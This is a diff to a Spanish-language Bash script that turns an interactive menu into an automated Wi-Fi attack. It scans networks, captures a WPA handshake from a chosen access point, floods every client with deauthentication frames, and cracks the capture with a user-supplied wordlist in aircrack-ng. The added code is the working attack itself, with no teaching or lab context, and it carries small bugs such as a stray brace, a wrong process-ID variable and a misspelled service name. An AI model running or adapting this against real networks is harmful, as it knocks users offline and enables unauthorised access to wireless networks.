@@ -51,11 +51,34 @@ if [ $airtest -eq 0 ]; then
 			echo -e "\n${greenColour}[*] Ya tienes tu tarjeta preparada!"
 		read -p "Quieres hacer un ataque? [Y/N]: " rps
 			if [ "$rps" == "Y" ] || [ "$rps" == "y" ]; then
-				echo -e "${purpleColour}"
-				read -p "Nombre de la red wifi: " wifi
+				xterm -hold -e "airodump-ng ${tar}mon" &
+				airodump_xterm_PID=$!
+				read -p "Que red deseas atacar?: " ap
+				read -p "En que canal esta ${ap}}?: " channel
+
+				kill -9 $airodump_xterm_PID
+				wait $airodump_xterm_PID 2>/dev/null
+
+				xterm -hold -e "airodump-ng -c $channel -w Handshake -essid $ap ${tar}mon" &
+				airodump_filter_xterm_PID=$?
+
+				sleep 5; xterm -hold -e "aireplay-ng -0 12 -e $ap -c FF:FF:FF:FF:FF:FF ${tar}mon" &
+				aireplay_xterm_PID=$!
+				sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null
+
+				sleep 10; kill -9 $airodump_filter_xterm_PID
+				wait $airodump_filter_xterm_PID 2>/dev/null
+
+				read -p "Ruta del diccionario al usar: " dicc
+				xterm -hold -e "aircrack-ng -w $dicc Handshake-01.cap" &
+				
+				echo -e "$blueColour"
+				echo -e "\nSe ha terminado el ataque a la red\n"
 				$cleancolor
-				xterm -hold -e "airodump-ng --essid $wifi ${tar}mon"
-			
+				airmon-ng stop ${tar}mon > /dev/null 2>&1
+				service NetworkManager start > /dev/null 2>&1
+				service wpa_suppclicant start > /dev/null 2>&1
+				break
 			fi
 			if [ "$rps" == "N" ] || [ "$rps" == "n" ]; then
 				echo -e "${redColour}\n[*] Saliendo"
